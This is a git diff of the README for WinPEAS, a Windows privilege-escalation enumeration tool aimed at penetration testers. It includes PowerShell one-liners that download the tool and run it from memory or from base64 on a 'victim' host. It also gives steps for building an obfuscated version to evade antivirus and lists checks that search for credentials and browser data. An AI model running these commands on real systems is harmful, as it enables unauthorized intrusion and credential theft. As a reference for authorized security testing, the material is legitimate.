@@ -2,9 +2,9 @@
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/images/winpeas.png)
 
-**WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)**
+**WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)**
 
-Check also the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)**
+Check also the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)**
 
 [![youtube](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/images/screen.png)](https://youtu.be/66gOwXMnxRI)
 
@@ -13,25 +13,24 @@ Check also the **Local Windows Privilege Escalation checklist** from **[book.hac
 **.Net >= 4.5.2 is required**
 
 Precompiled binaries:
-- Download the **[latest obfuscated version from here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases)** or **compile it yourself** (read instructions for compilation).
-- Non-Obfuscated [winPEASany.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe)
-- Non-Obfuscated [winPEASx64.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe)
-- Non-Obfuscated [winPEASx86.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/binaries/x86/Release/winPEASx86.exe)
+- Download the **[latest obfuscated and not obfuscated versions from here](https://github.com/carlospolop/PEASS-ng/releases/latest)** or **compile it yourself** (read instructions for compilation).
 
 ```bash
-#One liner to download and execute winPEASany from memory in a PS shell
-$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+# Get latest release
+$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
 
-#Before cmd in 3 lines
-$url = "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe"
+# One liner to download and execute winPEASany from memory in a PS shell
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+
+# Before cmd in 3 lines
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
 [winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
 
-#Load from disk in memory and execute:
+# Load from disk in memory and execute:
 $wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS.exe")));
 [winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
 
-#Load from disk in base64 and execute
+# Load from disk in base64 and execute
 ##Generate winpeas in Base64:
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("D:\Users\user\winPEAS.exe")) | Out-File -Encoding ASCII D:\Users\user\winPEAS.txt
 ##Now upload the B64 string to the victim inside a file or copy it to the clipboard
@@ -44,7 +43,7 @@ $thecontent = "aaaaaaaa..." #Where "aaa..." is the winpeas base64 string
 $wp = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($thecontent))
 [winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
 
-#Loading from file and executing a winpeas obfuscated version
+# Loading from file and executing a winpeas obfuscated version
 ##Load obfuscated version
 $wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS-Obfuscated.exe")));
 $wp.EntryPoint #Get the name of the ReflectedType, in obfuscated versions sometimes this is different from "winPEAS.Program"
@@ -67,8 +66,7 @@ winpeas.exe -lolbas  #Execute also additional LOLBAS search check
 
 ## Help
 ```
-quiet                Do not print banner
-notcolor             Don't use ansi colors (all white)
+domain               Enumerate domain information
 systeminfo           Search system information
 userinfo             Search user information
 processinfo          Search processes information
@@ -77,16 +75,22 @@ applicationsinfo     Search installed applications information
 networkinfo          Search network information
 windowscreds         Search windows credentials
 browserinfo          Search browser information
-filesinfo            Search files that can contains credentials
+filesinfo            Search generic files that can contains credentials
+fileanalysis         Search specific files that can contains credentials and for regexes inside files
 eventsinfo           Display interesting events information
+
+quiet                Do not print banner
+notcolor             Don't use ansi colors (all white)
+searchpf             Search credentials via regex also in Program Files folders
 wait                 Wait for user input between checks
 debug                Display debugging information - memory usage, method execution time
-log=[logfile]        Log all output to file defined as logfile, or to "out.txt" if not specified
+log[=logfile]        Log all output to file defined as logfile, or to "out.txt" if not specified
+MaxRegexFileSize=1000000        Max file size (in Bytes) to search regex in. Default: 1000000B
 
 Additional checks (slower):
 -lolbas              Run additional LOLBAS check
 -linpeas=[url]       Run additional linpeas.sh check for default WSL distribution, optionally provide custom linpeas.sh URL
-                     (default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
+                     (default: https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)
 ```
 
 ## Basic information
@@ -106,10 +110,14 @@ REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 
 Below you have some indications about what does each color means exacty, but keep in mind that **Red** is for something interesting (from a pentester perspective) and **Green** is something well configured (from a defender perspective).
 
+![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/images/colors.png)
 
 ## Instructions to compile you own obfuscated version
 
-In order to compile an **ofuscated version** of Winpeas and bypass some AVs you need to ** install dotfuscator ** in *VisualStudio*. 
+<details>
+  <summary>Details</summary>
+
+In order to compile an **ofuscated version** of Winpeas and bypass some AVs you need to ** install dotfuscator ** in *VisualStudio*.
 
 To install it *open VisualStudio --> Go to Search (CTRL+Q) --> Write "dotfuscator"* and just follow the instructions to install it.
 
@@ -126,16 +134,15 @@ Once you have installed and activated it you need to:
 
 ![](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/images/dotfuscator.PNG)
 
-
-## Colors
-
-![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/images/colors.png)
+**IMPORTANT**: Note that Defender will higly probable delete the winpeas iintial unobfuscated version, so you need to set as expections the origin folder of Winpeas and the folder were the obfuscated version will be saved:
+![](https://user-images.githubusercontent.com/1741662/148418852-e7ffee6a-c270-4e26-bf38-bb8977b3ad9c.png)
+</details>
 
 ## Checks
 
 <details>
   <summary>Details</summary>
-    
+
 - **System Information**
   - [x] Basic System info information
   - [x] Use Watson to search for vulnerabilities
@@ -159,7 +166,7 @@ Once you have installed and activated it you need to:
   - [x] AMSI Providers
   - [x] SysMon
   - [x] .NET Versions
-  
+
 - **Users Information**
   - [x] Users information
   - [x] Current token privileges
@@ -216,7 +223,7 @@ Once you have installed and activated it you need to:
   - [x] Security Package Credentials
   - [x] AlwaysInstallElevated
   - [x] WSUS
-  
+
 - **Browser Information**
   - [x] Firefox DBs
   - [x] Credentials in firefox history
@@ -249,15 +256,15 @@ Once you have installed and activated it you need to:
   - [x] Machine and user certificate files
   - [x] Office most recent documents
   - [x] Hidden files and folders
-  - [x] Executable files in non-default folders with write permissions  
-  - [x] WSL check 
+  - [x] Executable files in non-default folders with write permissions
+  - [x] WSL check
 
 - **Events Information**
   - [x] Logon + Explicit Logon Events
   - [x] Process Creation Events
   - [x] PowerShell Events
   - [x] Power On/Off Events
-  
+
 - **Additional (slower) checks**
   - [x] LOLBAS search
   - [x] run **[linpeas.sh](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)** in default WSL distribution
@@ -274,16 +281,9 @@ If you find any issue, please report it using **[github issues](https://github.c
 
 **WinPEAS** is being **updated** every time I find something that could be useful to escalate privileges.
 
-## Please, if this tool has been useful for you consider to donate
-
-[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.patreon.com/peass)
-
 ## Advisory
 
 All the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
 
-## License
 
-MIT License
-
-By Polop<sup>(TM)</sup>, makikvues (makikvues2[at]gmail[dot].com)
+By Polop
